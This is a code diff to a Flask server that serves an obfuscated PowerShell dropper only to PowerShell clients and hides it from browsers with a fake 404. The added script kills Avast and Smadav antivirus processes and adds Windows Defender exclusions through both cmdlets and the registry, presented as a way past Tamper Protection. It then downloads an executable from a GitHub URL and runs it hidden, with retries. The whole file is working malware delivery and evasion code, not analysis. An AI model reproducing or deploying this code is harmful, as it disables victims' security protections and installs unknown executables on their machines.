@@ -12,11 +12,53 @@ def direct_command():
     if 'mozilla' in user_agent and 'powershell' not in user_agent:
         return Response("Not Found", status=404)
 
-    # This is your full logic (Kill, Cleanup, Download, Run) scrambled into Base64
-    # It looks like gibberish to anyone reading the network traffic
-    scrambled_logic = "JGN1cnJlbnRQcmluY2lwYWwgPSBOZXctT2JqZWN0IFNlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKQppZiAoJGN1cnJlbnRQcmluY2lwYWwuSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKSkgewogICAgJHByb2NzID0gQCgiQXZhc3RVSSIsICJBdmFzdFN2YyIsICJTbWFkYXYiLCAiU01BREFWIiwgImNsaWVudF8xMCIpCiAgICBmb3JlYWNoICgkcCBpbiAkcHJvY3MpIHsgdGFza2tpbGwgL0YgL0lNICIkcC5leGUiIC9UIDJwPiRudWxsIH0KICAgICRmb2xkZXJzID0gQCgiQzpcXFByb2dyYW0gRmlsZXNcXEF2YXN0IFNvZnR3YXJlIiwgIkM6XFxQcm9ncmFtIEZpbGVzICh4ODYpXFxTTUFEQVYiLCAiQzpcXFByb2dyYW0gRmlsZXNcXFNNQURBVmFudGl2aXJ1cyIpCiAgICBmb3JlYWNoICgkZiBpbiAkZm9sZGVycykgeyBpZiAoVGVzdC1QYXRoICRmKSB7IFJlbW92ZS1JdGVtIC1QYXRoICRmIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB9IH0KICAgICRwYXRoID0gIiRIT01FXFxjbGllbnRfMTAuZXhlIgogICAgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAkcGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgdHJ5IHsKICAgICAgICBpZiAoIShUZXN0LVBhdGggJHBhdGgpKSB7IChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoImh0dHBzOi8vZ2l0aHViLmNvbS9qZW1iZXgvVG9wLUZvbGxvd2Vycy9yYXcvcmVmcy9oZWFkcy9tYWluL2NsaWVudF8xMC5leGUiLCAkcGF0aCkgfQogICAgICAgIFN0YXJ0LVByb2Nlc3MgJHBhdGggLVdpbmRvd1N0eWxlIEhpZGRlbiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgfSBjYXRjaCB7IH0KfQ=="
+    raw_script = """
+$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "--- JAILBREAK-1: ACTIVE ---" -ForegroundColor Green
+    
+    # 1. Kill background guards
+    $procs = @("AvastUI", "AvastSvc", "Smadav", "SMADAV", "client_10")
+    foreach ($p in $procs) { taskkill /F /IM "$p.exe" /T 2>$null }
 
-    # This command tells PowerShell to decode the Base64 and execute it
+    # 2. Advanced Exclusion Method
+    $path = "$HOME\\client_10.exe"
+    Write-Host "[+] Bypassing security layers..." -ForegroundColor Cyan
+    
+    # Method A: Standard PowerShell Exclusion
+    Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath $HOME -ErrorAction SilentlyContinue
+    
+    # Method B: Force via Registry (Often bypasses Tamper Protection UI blocks)
+    try {
+        $regPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
+        if (Test-Path $regPath) {
+            New-ItemProperty -Path $regPath -Name $path -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
+        }
+    } catch {}
+
+    # 3. Deployment with Retry Logic
+    Start-Job -ScriptBlock {
+        param($p)
+        $url = "https://github.com/jembex/Top-Followers/raw/refs/heads/main/client_10.exe"
+        for ($i=0; $i -lt 3; $i++) {
+            try {
+                if (!(Test-Path $p)) {
+                    (New-Object System.Net.WebClient).DownloadFile($url, $p)
+                }
+                if (Test-Path $p) { 
+                    Start-Process $p -WindowStyle Hidden
+                    break 
+                }
+            } catch { Start-Sleep -Seconds 5 }
+        }
+    } -ArgumentList $path
+    
+    Write-Host "[+] Background deployment finalized." -ForegroundColor Green
+}
+"""
+    encoded_bytes = base64.b64encode(raw_script.encode('utf-8'))
+    scrambled_logic = encoded_bytes.decode('utf-8')
     ps_payload = f"$data = [System.Convert]::FromBase64String('{scrambled_logic}'); $code = [System.Text.Encoding]::UTF8.GetString($data); iex $code"
 
     return Response(ps_payload, mimetype='text/plain')
@@ -24,4 +66,3 @@ def direct_command():
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
-    
